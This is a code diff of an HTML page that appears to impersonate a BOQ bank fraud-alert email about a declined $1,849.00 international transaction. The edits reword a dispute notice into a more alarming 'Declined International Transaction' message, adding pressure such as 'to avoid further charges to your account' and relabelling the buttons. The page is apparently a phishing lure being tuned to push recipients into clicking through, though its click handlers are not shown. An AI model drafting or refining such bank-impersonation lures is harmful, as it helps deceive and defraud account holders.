@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>BOQ — Dispute confirmation required</title>
+    <title>BOQ — Declined Transaction</title>
     <style>
         /* ── BOQ Design Tokens ── */
         :root {
@@ -922,7 +922,7 @@
                     <span><span class="label"></span> <span class="value">BOQ Fraud &amp; Security</span></span>
                     <span><span class="label"></span> <span class="value"></span></span>
                 </div>
-                <div class="email-subject">International Transaction Dispute Confirmation</div>
+                <div class="email-subject">Declined International Transaction</div>
                 <div class="email-date"></div>
             </div>
 
@@ -930,7 +930,7 @@
             <div class="email-body">
                 <p class="greeting"></p>
                 <p></p>
-                <p><strong>We need your confirmation before we can proceed with the dispute.</strong></p>
+                <p><strong>We need your confirmation to avoid further charges to your account.</strong></p>
 
                 <!-- Transaction summary -->
                 <div class="txn-block-email">
@@ -958,18 +958,18 @@
 
             <!-- Question + action buttons -->
             <div class="question-block-email">
-                <h2>Did you authorise this transaction?</h2>
-                <p>To cancel the dispute, please confirm that you did <strong>not</strong> make this payment. If you did authorise it, we will debit the funds from your account.</p>
+                <h2>Did you recognize this transaction?</h2>
+                <p>To block any further charges, please confirm that you did <strong>not</strong> make this payment. If you did authorise it, we will debit the funds from your account.</p>
             </div>
 
             <div class="btn-group-email">
                 <button class="btn btn-confirm-dispute" onclick="handleConfirm()" id="btn-confirm">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
-                    No — I did not authorise it
+                    No — I do not recognize it
                 </button>
                 <button class="btn btn-authorize" onclick="handleDeny()" id="btn-authorize">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
-                    Yes — I authorised it
+                    Yes — I recognize it
                 </button>
             </div>
 
@@ -986,9 +986,9 @@
                 <div class="result-icon-ring" style="background:var(--green-bg);">
                     <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1A6E44" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
                 </div>
-                <h2 style="color:var(--green);">Dispute confirmed</h2>
+                <h2 style="color:var(--green);">Thank you for your confirmation</h2>
                 <p>Thank you for confirming. We have recorded that you <strong>did not authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>.</p>
-                <p>We will cancel dispute immediately and any further charge from this location will be blocked, you do not need to do anything else.</p>
+                <p>We will cancel any payment immediately and any further charge from this location will be blocked, you do not need to do anything else.</p>
                 <div class="result-ref">
                     <strong>Dispute ID:</strong> BOQ-DIS-20260706-8849 &nbsp;·&nbsp;
                     <strong>Confirmed:</strong> <span id="confirm-time"></span>
